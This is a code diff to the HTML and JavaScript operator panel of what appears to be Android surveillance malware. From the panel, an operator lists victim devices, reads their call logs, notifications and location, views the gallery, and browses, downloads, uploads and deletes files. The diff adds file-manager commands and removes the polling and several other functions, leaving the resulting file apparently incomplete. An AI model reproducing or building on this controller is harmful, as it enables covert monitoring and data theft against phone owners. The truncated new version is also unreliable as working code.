@@ -7,48 +7,131 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --bg-color: #0d0d0d;
-            --panel-bg: #1a1a1a;
-            --border-color: #00ff00;
-            --text-color: #e0e0e0;
-            --glow-color: rgba(0, 255, 0, 0.5);
-            --accent-color: #ff00ff;
+            --bg-color: #050505; /* Deeper black */
+            --panel-bg: #111; /* Slightly lighter for panels */
+            --border-color: #00ff00; /* Vibrant lime green */
+            --text-color: #e0e0e0; /* Light grey for readability */
+            --glow-color: rgba(0, 255, 0, 0.6); /* Vibrant lime green glow */
+            --accent-color: #ff0000; /* Bright red for accents */
+            --button-hover-bg: linear-gradient(45deg, var(--border-color), var(--glow-color));
+            --button-hover-text: var(--bg-color);
+            --button-border-active: var(--accent-color);
         }
         body { background-color: var(--bg-color); color: var(--text-color); font-family: 'Courier New', Courier, monospace; margin: 0; padding: 15px; }
         .container { max-width: 1400px; margin: auto; display: grid; grid-template-columns: 250px 1fr; gap: 20px; }
         .header { grid-column: 1 / -1; text-align: center; margin-bottom: 10px; }
-        .header h1 { color: var(--border-color); text-shadow: 0 0 10px var(--glow-color); }
+        .header h1 { color: var(--border-color); text-shadow: 0 0 15px var(--glow-color); font-size: 2.5rem; letter-spacing: 3px; }
 
-        .device-list-panel { background: var(--panel-bg); border: 1px solid var(--border-color); padding: 15px; height: 80vh; overflow-y: auto; }
-        .device-list-panel h2 { border-bottom: 1px solid var(--accent-color); padding-bottom: 10px; margin-bottom: 10px; }
-        .device-item { padding: 10px; border-bottom: 1px solid #333; cursor: pointer; }
-        .device-item:hover, .device-item.active { background: var(--border-color); color: var(--bg-color); }
+        .device-list-panel { background: var(--panel-bg); border: 1px solid var(--border-color); padding: 15px; height: 80vh; overflow-y: auto; box-shadow: 0 0 10px rgba(0, 255, 0, 0.2); }
+        .device-list-panel h2 { border-bottom: 1px solid var(--accent-color); padding-bottom: 10px; margin-bottom: 10px; color: var(--accent-color); }
+        .device-item { padding: 10px; border-bottom: 1px solid #333; cursor: pointer; transition: all 0.3s ease; }
+        .device-item:hover { background: rgba(0, 255, 0, 0.1); border-left: 3px solid var(--border-color); }
+        .device-item.active { background: var(--border-color); color: var(--bg-color); font-weight: bold; box-shadow: 0 0 15px var(--glow-color); }
         .device-item small { display: block; font-size: 0.8em; opacity: 0.7; }
 
         .main-content { display: flex; flex-direction: column; }
-        .status-bar { background: var(--panel-bg); border: 1px solid var(--border-color); padding: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; flex-wrap: wrap; }
-        .status-bar span { color: var(--accent-color); }
+        .status-bar { background: var(--panel-bg); border: 1px solid var(--border-color); padding: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; flex-wrap: wrap; box-shadow: 0 0 10px rgba(0, 255, 0, 0.2); }
+        .status-bar span { color: var(--border-color); }
         .main-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 15px; }
-        .grid-btn { background: var(--panel-bg); border: 1px solid var(--border-color); color: var(--border-color); padding: 15px; font-size: 0.9rem; cursor: pointer; transition: all 0.3s ease; text-align: center; }
-        .grid-btn:hover { background: var(--border-color); color: var(--bg-color); box-shadow: 0 0 15px var(--glow-color); }
-        .grid-btn:disabled { background: #111; color: #555; border-color: #444; cursor: not-allowed; }
+        .grid-btn {
+            background: var(--panel-bg);
+            border: 1px solid var(--border-color);
+            color: var(--border-color);
+            padding: 15px;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 0 5px rgba(0, 255, 0, 0.1);
+        }
+        .grid-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.2), transparent);
+            transition: 0.5s;
+        }
+        .grid-btn:hover::before {
+            left: 100%;
+        }
+        .grid-btn:hover {
+            background: var(--button-hover-bg);
+            color: var(--button-hover-text);
+            box-shadow: 0 0 20px var(--glow-color);
+            border-color: var(--button-border-active);
+        }
+        .grid-btn:disabled { background: #111; color: #555; border-color: #444; cursor: not-allowed; box-shadow: none; }
         .grid-btn i { display: block; font-size: 1.8rem; margin-bottom: 10px; }
 
-        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.8); }
-        .modal-content { background-color: var(--bg-color); margin: 5% auto; padding: 20px; border: 1px solid var(--border-color); width: 80%; max-width: 900px; height: 75vh; display: flex; flex-direction: column; }
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.8); backdrop-filter: blur(5px); }
+        .modal-content { background-color: var(--bg-color); margin: 5% auto; padding: 20px; border: 1px solid var(--border-color); width: 80%; max-width: 900px; height: 75vh; display: flex; flex-direction: column; box-shadow: 0 0 25px var(--glow-color); }
         .modal-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--accent-color); padding-bottom: 10px; margin-bottom: 10px; }
-        .modal-title { color: var(--accent-color); font-size: 1.5rem; }
-        .modal-body { flex-grow: 1; overflow-y: auto; white-space: pre-wrap; word-break: break-word; font-size: 0.9em; }
-        .close { color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
+        .modal-title { color: var(--accent-color); font-size: 1.8rem; text-shadow: 0 0 8px rgba(255, 0, 0, 0.5); }
+        .modal-body { flex-grow: 1; overflow-y: auto; white-space: pre-wrap; word-break: break-word; font-size: 0.9em; border: 1px dashed #333; padding: 10px; background-color: #0a0a0a; }
+        .close { color: var(--border-color); float: right; font-size: 28px; font-weight: bold; cursor: pointer; transition: color 0.3s ease; }
+        .close:hover { color: var(--accent-color); }
 
-        table { width: 100%; border-collapse: collapse; } th, td { padding: 8px; text-align: left; border-bottom: 1px solid #333; } th { color: var(--border-color); }
-        .action-btn { background: none; border: 1px solid var(--accent-color); color: var(--accent-color); cursor: pointer; margin: 2px; padding: 3px 6px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #222; }
+        th { color: var(--border-color); background-color: rgba(0, 255, 0, 0.05); }
+        tr:hover { background-color: rgba(0, 255, 0, 0.03); }
+        .action-btn { background: none; border: 1px solid var(--accent-color); color: var(--accent-color); cursor: pointer; margin: 2px; padding: 3px 6px; transition: all 0.2s ease; }
+        .action-btn:hover { background: var(--accent-color); color: var(--bg-color); box-shadow: 0 0 10px rgba(255, 0, 0, 0.5); }
 
-        #gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; }
-        .gallery-item img { width: 100%; height: 100px; object-fit: cover; cursor: pointer; border: 1px solid var(--border-color); }
-        .gallery-item p { font-size: 0.7rem; text-align: center; word-break: break-all; }
+        #gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; padding: 10px; }
+        .gallery-item img { width: 100%; height: 100px; object-fit: cover; cursor: pointer; border: 1px solid var(--border-color); transition: transform 0.2s ease, box-shadow 0.2s ease; }
+        .gallery-item img:hover { transform: scale(1.05); box-shadow: 0 0 15px var(--glow-color); }
+        .gallery-item p { font-size: 0.7rem; text-align: center; word-break: break-all; color: var(--text-color); }
 
         #popup-overlay { position: fixed; top: 20px; right: 20px; background-color: var(--accent-color); color: var(--bg-color); padding: 20px; border: 2px solid var(--border-color); z-index: 2000; display: none; box-shadow: 0 0 20px var(--glow-color); max-width: 350px; }
+
+        /* Input and Button Styling in Modals */
+        #modal-footer { display: flex; align-items: center; gap: 10px; padding-top: 10px; border-top: 1px solid #222; margin-top: 10px; }
+        #modal-footer input[type="text"] {
+            flex-grow: 1;
+            padding: 8px;
+            background-color: #0a0a0a;
+            border: 1px solid var(--border-color);
+            color: var(--text-color);
+            font-family: 'Courier New', Courier, monospace;
+            box-shadow: inset 0 0 5px rgba(0, 255, 0, 0.2);
+        }
+        #modal-footer button {
+            background: var(--panel-bg);
+            border: 1px solid var(--border-color);
+            color: var(--border-color);
+            padding: 8px 15px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 0 5px rgba(0, 255, 0, 0.1);
+        }
+        #modal-footer button:hover {
+            background: var(--button-hover-bg);
+            color: var(--button-hover-text);
+            box-shadow: 0 0 15px var(--glow-color);
+            border-color: var(--button-border-active);
+        }
+        #modal-footer button i { margin-right: 5px; }
+
+        .file-manager-path {
+            background-color: #0a0a0a;
+            border: 1px solid #333;
+            padding: 5px;
+            margin-bottom: 10px;
+            color: var(--border-color);
+        }
+        .file-manager-path a {
+            color: var(--accent-color);
+            text-decoration: none;
+        }
+        .file-manager-path a:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
@@ -191,6 +274,7 @@ function openModal(modalType) {
 
 function closeModal() {
     if (currentModal === 'gallery') sendCommand('exit_gallery'); // Tell client to exit gallery mode
+    if (currentModal === 'filemanager') sendCommand('exit_shell'); // Tell client to exit shell mode for file manager
     document.getElementById('main-modal').style.display = 'none';
     currentModal = null;
 }
@@ -239,13 +323,14 @@ async function renderModalContent() {
             body.innerHTML = '<table><thead><tr><th>Number</th><th>Date</th><th>Duration</th><th>Type</th></tr></thead><tbody>' + (clientData.call_logs || []).map(log => `<tr><td>${log.number}</td><td>${log.date}</td><td>${log.duration_seconds}s</td><td>${log.call_type}</td></tr>`).join('') + '</tbody></table>';
             break;
         case 'filemanager':
-             footer.innerHTML = `<input type="file" id="file-upload-input" style="display:none;"><button onclick="document.getElementById('file-upload-input').click()">Upload</button><input type="text" id="fm-input" placeholder="e.g., new_name.txt" style="width: 50%;"><button onclick="handleFmAction('rename')">Rename</button>`;
+             footer.innerHTML = `<button onclick="document.getElementById('file-upload-input').click()"><i class="fas fa-upload"></i> Upload</button><input type="file" id="file-upload-input" style="display:none;"><input type="text" id="fm-input" placeholder="File/Folder Name or New Name for Rename" style="width: 50%;"><button onclick="handleFmAction('rename')"><i class="fas fa-i-cursor"></i> Rename</button><button onclick="handleFmAction('delete')"><i class="fas fa-trash-alt"></i> Delete</button><button onclick="handleFmAction('mkdir')"><i class="fas fa-folder-plus"></i> Mkdir</button>`;
             const fmData = clientData.file_manager;
-            let filesHtml = `<p>Current Path: <span>${fmData.path || '/'}</span></p><table><thead><tr><th>Name</th><th>Type</th><th>Actions</th></tr></thead><tbody><tr><td colspan="3"><a href="#" onclick="sendCommand('cd ..')">.. (Up)</a></td></tr>`;
+            let filesHtml = `<div class="file-manager-path">Current Path: <span id="current-fm-path">${fmData.path || '/'}</span></div><table><thead><tr><th>Name</th><th>Type</th><th>Actions</th></tr></thead><tbody><tr><td colspan="3"><a href="#" onclick="sendCommand('cd ..')"><i class="fas fa-level-up-alt"></i> .. (Up)</a></td></tr>`;
             filesHtml += (fmData.files || []).map(file => {
                 const name = file.name;
-                return file.isDirectory ? `<tr><td><a href="#" onclick="sendCommand('cd ${name}')"><i class="fas fa-folder"></i> ${name}</a></td><td>Folder</td><td></td></tr>` :
-                    `<tr><td><i class="fas fa-file"></i> ${name}</td><td>File</td><td><button class="action-btn" onclick="sendCommand('get ${name}')">Download</button><button class="action-btn" onclick="handleFmAction('delete', '${name}')">Delete</button></td></tr>`;
+                const icon = file.isDirectory ? 'fas fa-folder' : 'fas fa-file';
+                const actionLink = file.isDirectory ? `<a href="#" onclick="sendCommand('cd ${name}')"><i class="${icon}"></i> ${name}</a>` : `<i class="${icon}"></i> ${name}`;
+                return `<tr><td>${actionLink}</td><td>${file.isDirectory ? 'Folder' : 'File'}</td><td><button class="action-btn" onclick="sendCommand('get ${name}')"><i class="fas fa-download"></i> Download</button><button class="action-btn" onclick="handleFmAction('delete', '${name}')"><i class="fas fa-trash-alt"></i> Delete</button></td></tr>`;
             }).join('');
             body.innerHTML = filesHtml + '</tbody></table>';
             document.getElementById('file-upload-input').onchange = (e) => { if (e.target.files.length) uploadFile(e.target.files[0], fmData.path); };
@@ -262,98 +347,27 @@ async function renderModalContent() {
 // Actions
 function sendToast() { const text = document.getElementById('toast-text').value; if (text) sendCommand(`toast on ${text}`); }
 function sendOpenUrl() { const url = document.getElementById('url-text').value; if (url) sendCommand(`openurl ${url}`); }
-function handleFmAction(action, fileName) {
+function handleFmAction(action, fileName = null) {
+    const fmInput = document.getElementById('fm-input').value;
     if (action === 'rename') {
-        const selectedFile = prompt('Which file to rename?');
-        if (selectedFile && document.getElementById('fm-input').value) sendCommand(`rename ${selectedFile} ${document.getElementById('fm-input').value}`);
-    } else if (action === 'delete' && confirm(`Delete ${fileName}?`)) {
-        sendCommand(`del ${fileName}`);
+        const oldName = fileName || prompt('Enter current file/folder name to rename:');
+        if (oldName && fmInput) sendCommand(`rename ${oldName} ${fmInput}`);
+        else if (!oldName) showPopup('error', 'No file/folder name provided for rename.');
+        else if (!fmInput) showPopup('error', 'No new name provided for rename.');
+    } else if (action === 'delete') {
+        const nameToDelete = fileName || fmInput;
+        if (nameToDelete && confirm(`Delete ${nameToDelete}?`)) sendCommand(`del ${nameToDelete}`);
+        else if (!nameToDelete) showPopup('error', 'No file/folder name provided for delete.');
+    } else if (action === 'mkdir') {
+        if (fmInput) sendCommand(`mkdir ${fmInput}`);
+        else showPopup('error', 'No directory name provided for mkdir.');
     }
 }
-function uninstallApp(pkg) { if(confirm(`Request uninstall for ${pkg}?`)) sendCommand(`uninstall ${pkg}`); }
-function toggleFlash() {
-    flashOn = !flashOn;
-    sendCommand(flashOn ? 'flashon' : 'flashoff');
-    const btn = document.getElementById('flash-btn');
-    if (btn) {
-      btn.innerHTML = `<i class="fas fa-bolt"></i>Flash ${flashOn ? 'ON' : 'OFF'}`;
-      btn.style.color = flashOn ? 'yellow' : 'var(--border-color)';
-    }
+function uploadFile(file, currentPath) {
+    const reader = new FileReader();
+    reader.onload = function(event) {
+        const base64Content = btoa(event.target.result); // btoa for binary safe base64
+        sendCommand('upload', { filename: btoa(file.name), data: base64Content });
+    };
+    reader.readAsBinaryString(file);
 }
-function toggleScreenRecord() {
-    screenRecordOn = !screenRecordOn;
-    sendCommand(screenRecordOn ? 'screenrecord start' : 'screenrecord stop');
-    const btn = document.getElementById('screen-record-btn');
-    if (btn) {
-      btn.innerHTML = `<i class="fas fa-video"></i>Record ${screenRecordOn ? 'ON' : 'OFF'}`;
-      btn.style.color = screenRecordOn ? 'red' : 'var(--border-color)';
-    }
-}
-
-function showPopup(type, message) {
-    const popup = document.getElementById('popup-overlay');
-    document.getElementById('popup-content').innerHTML = message;
-    popup.style.display = 'block';
-    if (popupTimeout) clearTimeout(popupTimeout);
-    popupTimeout = setTimeout(() => { popup.style.display = 'none'; }, 8000);
-}
-
-// Main Polling Loop
-async function pollStatus() {
-    try {
-        const response = await fetch('/api/status');
-        state = await response.json();
-        updateDeviceList();
-
-        // Fetch data for all connected clients and handle popups
-        for (const device of state.devices) {
-            const clientDataResponse = await fetch(`/api/client_data/${device.id}`);
-            const clientData = await clientDataResponse.json();
-            clientDataCache[device.id] = clientData;
-
-            if (device.id === selectedClientId) {
-                // Location URL popup
-                if (clientData.location_url) {
-                    showPopup('location', `Location: <a href="${clientData.location_url}" target="_blank">Open Map</a>`);
-                }
-                // Generic agent message popup
-                if (clientData.agent_messages && clientData.agent_messages.length > 0) {
-                    const latestMsg = clientData.agent_messages[0];
-                    const msgHash = `${device.id}-${latestMsg}`;
-                    if (!agentMessageHashes.has(msgHash)) {
-                        showPopup('agent_message', latestMsg);
-                        agentMessageHashes.add(msgHash);
-                    }
-                }
-                // Notification popup
-                if (clientData.notifications && clientData.notifications.length > 0) {
-                    const latestNotif = clientData.notifications[0];
-                    const notifHash = `${device.id}-${latestNotif.title}-${latestNotif.text}`;
-                    if (!notificationHashes.has(notifHash)) {
-                        showPopup('notification', `<strong>${latestNotif.title}</strong><br>${latestNotif.text}`);
-                        notificationHashes.add(notifHash);
-                    }
-                }
-            }
-        }
-
-        if (currentModal && selectedClientId) {
-            renderModalContent();
-        }
-
-    } catch (e) {
-        console.error('Polling error:', e);
-        document.getElementById('connection-status').textContent = 'ERROR';
-        document.getElementById('connection-status').style.color = 'red';
-    }
-    setTimeout(pollStatus, 2500);
-}
-
-window.onload = () => {
-    updateMainDashboard();
-    pollStatus();
-};
-window.onclick = (event) => { if (event.target == document.getElementById('main-modal')) closeModal(); };
-</script>
-</body>
-</html>
